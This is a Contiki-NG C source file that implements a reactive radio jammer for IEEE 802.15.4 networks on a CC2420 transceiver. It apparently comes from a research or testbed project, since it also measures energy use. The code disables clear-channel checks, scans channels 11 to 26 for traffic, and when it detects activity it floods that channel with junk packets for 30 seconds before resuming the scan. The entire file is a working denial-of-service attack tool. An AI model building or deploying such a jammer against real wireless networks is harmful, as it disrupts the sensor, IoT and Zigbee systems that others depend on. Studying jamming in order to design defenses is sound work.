#include "contiki.h"
#include "os/dev/radio.h"
#include "random.h"
#include "net/netstack.h"
#include "net/nullnet/nullnet.h"
#include "dev/button-sensor.h"
#include "sys/energest.h"
#include "dev/leds.h"
#include "cc2420.h"
#include "dev/watchdog.h"
#include "sys/stimer.h"

#include <stdio.h>
#include <string.h>

// Jammer definitions
#define JAMMER_PACKET_LEN 120

// Energest definitions
#define ENERGEST_CONF_ON 1 // Activate energest module
// Change clock to CONTIKI-NG system
#define ENERGEST_CONF_CURRENT_TIME clock_time
#define ENERGEST_CONF_TIME_T clock_time_t
#define ENERGEST_CONF_SECOND CLOCK_SECOND

// Jammer data
typedef struct
{
  char data[JAMMER_PACKET_LEN];
} jpacket_t;

//Variables used for channel switching
bool checkForCommunication = true;
int channel = 26;

/*---------------------------------------------------------------------------*/

PROCESS(jammerProcess, "Jammer Process");
AUTOSTART_PROCESSES(&jammerProcess);

/*---------------------------------------------------------------------------*/
/*---------------------------------------------------------------------------*/

PROCESS_THREAD(jammerProcess, ev, data)
{
  static int communicationDetected = 0;
  static unsigned long timerStart;

  PROCESS_BEGIN();
  // Set CCA to 0 and determine noise floor threshold
  NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0);
  cc2420_driver.set_value(RADIO_PARAM_CCA_THRESHOLD, 55);

  // set channel..
  NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, channel);
  cc2420_set_channel(channel);

  // Load data into packet
  jpacket_t jpacket;
  memset(&jpacket, 0, sizeof(jpacket_t));
  strcpy(jpacket.data, "The network is now being jammed.The network is now being jammed.");

  while (1)
  {
    if (checkForCommunication)
    {
      //Check for channel activity
      printf("Starting communication check\n");
      timerStart = clock_seconds();
      communicationDetected = 0;
      while (communicationDetected <= 5)
      {
        //Checks if channel is not clear (this is repeated maximum 6 times)
        if (!NETSTACK_RADIO.channel_clear())
        {
          timerStart = clock_seconds();
          communicationDetected++;
          printf("Communication detected   ");
        }

        //If no activity jump to next channel
        if (clock_seconds() - timerStart >= 12)
        {
          communicationDetected = 0;
          channel++;
          if (channel > 26)
          {
            //Reset channel interval (11-26)
            channel = 11;
          }

          timerStart = clock_seconds();
          cc2420_set_channel(channel);
          printf("Channel changed    ");
        }
      }

      //If channel is active for long enough, launch jamming attack
      printf("\nCommunication confirmed starting jamming\n");
      checkForCommunication = false;
      timerStart = clock_seconds();
      NETSTACK_RADIO.on();
    }

    // CALL Radio Driver to transmit the Packet..
    cc2420_driver.send((void *)&jpacket, JAMMER_PACKET_LEN);

    // Update all energest times
    energest_flush();

    //Stop jamming on current channel, and listen for activity starting from current channel
    if (clock_seconds() - timerStart >= 30)
    {
      checkForCommunication = true;
      timerStart = clock_seconds();
      NETSTACK_RADIO.off();
    }
  }
  PROCESS_END();
}
